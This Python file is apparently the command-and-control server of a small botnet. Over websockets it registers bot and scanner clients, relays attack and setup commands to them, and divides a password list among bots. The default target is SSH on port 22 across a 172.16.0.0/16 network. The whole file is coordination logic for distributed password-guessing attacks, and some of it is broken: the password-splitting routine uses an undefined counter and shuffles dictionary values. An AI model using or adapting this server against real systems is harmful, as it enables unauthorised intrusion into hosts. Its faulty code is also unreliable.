import os
import json
import time
import socket
import asyncio
import websockets
import logging
import random
import math

MOD_PORT = 4567

SCANNER = 'scan'
ATTACK = 'attack'
PWDS = 52

IPS = '172.16.0.0/16'

GUI_CONN = {
            SCANNER: {'ws': None, 'connected': False, 'handles':{}, 'init': {'frequency': 2, 'ip': IPS, 'port': '22'}},
            ATTACK: {'ws': None, 'connected': False, 'handles':{}, 'init': {'frequency': 2, 'ip': IPS, 'port': '22'}}
            }
logging.basicConfig(level=logging.INFO, filename='log_cnc.log', filemode='a', format='%(name)s - %(asctime)s - %(levelname)s  - %(message)s')

# This msg is sent as soon as a new bot or scanner connects to cnc.
async def send_init_msg(conn, i_type):

    try:
        temp_msg = {'event': 'EVT_INIT', 'data' : GUI_CONN[i_type]['init']}
    except:
        logging.error("Invalid type in send_init_msg.")
        return

    await conn.send(json.dumps(temp_msg))

# This msg is sent to all the connected bots or scanners.
async def command_to_device(i_msg, i_type):      

    try:
        handler = GUI_CONN[i_type]['handles']
    except:
        logging.error("Invalid type in command_to_device.")
        return

    o_msg = {'event': i_msg['event'], 'data': None}
    del i_msg['event']
    o_msg['data'] = i_msg

    for a_handle in handler.values():
        await a_handle.send(json.dumps(o_msg))

# Routine to update the number of passwords to try.
async def update_lookup_dict():
    try:
        handler = GUI_CONN[ATTACK]['handles']
    except:
        logging.error("Invalid type in command_to_device.")
        return

    o_msg = {'event': 'EVT_LOOKUP_RANGE', 'data': None}

    l_start = 0
    l_end = 0

    try:   
      l_per_head = math.ceil(PWDS/len(handler))
      random.shuffle(handler.values())


      for a_handle in handler.values():
        l_end = l_count+l_per_head
        if (l_end) > PWDS-1:
            l_end = PWDS-1
            
        o_msg['data'] = {'start': l_count, 'end':l_end}
        await a_handle.send(json.dumps(o_msg))
        l_count += l_per_head
    except:
        logging.error('Exception for handlers in lookup_dict.')

# Routine to update the GUI.
async def update_GUI():
        global  GUI_CONN
        
        for a_module in GUI_CONN:
            if GUI_CONN[a_module]['connected']:
                temp_msg = {'event':'EVT_UPDATE', 'count': len(GUI_CONN[a_module]['handles'])}
                await GUI_CONN[a_module]['ws'].send(json.dumps(temp_msg))
            else:
                logging.error('GUI not connected.')

# Process msg. 
async def process_msg(msg, module):
    global GUI_CONN
    msg = json.loads(msg)

    if not 'event' in msg.keys():
        print("Event not in the message.")
        return

    event = msg['event']

    if event == "EVT_ATTACK":       
        logging.info('Attacking => {}'.format(msg) )
        await command_to_device(msg, ATTACK)
    elif event == "EVT_SETUP_A":
        GUI_CONN[ATTACK]['init']['frequency'] = msg['frequency']
        GUI_CONN[ATTACK]['init']['ip'] = msg['ip']
        GUI_CONN[ATTACK]['init']['port'] = msg['port']
        msg['event'] = "EVT_SETUP"
        await command_to_device(msg, ATTACK)
    elif event == "EVT_SETUP_S":
        GUI_CONN[SCANNER]['init']['frequency'] = msg['frequency']
        GUI_CONN[SCANNER]['init']['ip'] = msg['ip']
        GUI_CONN[SCANNER]['init']['port'] = msg['port']
        msg['event'] = "EVT_SETUP"
        await command_to_device(msg, SCANNER)
    else:
        logging.error(msg)
        print("Unknown event {} received.".format(event))

# Receiver events.
async def recv_module_event(websocket, path):
    global GUI_CONN
    module = os.path.basename(path)
    logging.info('Module {}, Address {} connected.'.format(module, websocket.remote_address))

    if not ( module == SCANNER or  module == ATTACK):
        if module.find('bot_') >= 0:
            GUI_CONN[ATTACK]['handles'][module] = websocket
            await send_init_msg(websocket, ATTACK)
            #await update_lookup_dict()
        elif module.find('scanner_') >= 0:
            GUI_CONN[SCANNER]['handles'][module] = websocket
            await send_init_msg(websocket, SCANNER)
        
        await update_GUI()
    else:
        GUI_CONN[module]['connected'] = True
        GUI_CONN[module]['ws'] = websocket

    try:
        while(True) :
            msg = await websocket.recv()
            print("Received msg {}".format(msg))

            await process_msg(msg, websocket)

    except websockets.exceptions.ConnectionClosed:
        if module.find('bot_')>=0:
            del GUI_CONN[ATTACK]['handles'][module]
            await update_GUI()
            #await update_lookup_dict()
        elif module.find('scanner_')>=0:
            del GUI_CONN[SCANNER]['handles'][module]
            await update_GUI()
        else:    
            GUI_CONN[module]['ws'] = None
            GUI_CONN[module]['connected'] = False
            
            
        logging.info("{} connection closed.".format(module))
        

EVENT_LOOP = asyncio.get_event_loop()

task = websockets.serve(recv_module_event, '0.0.0.0', MOD_PORT)
EVENT_LOOP.run_until_complete(task)

try:
    EVENT_LOOP.run_forever()
except KeyboardInterrupt:
    pass
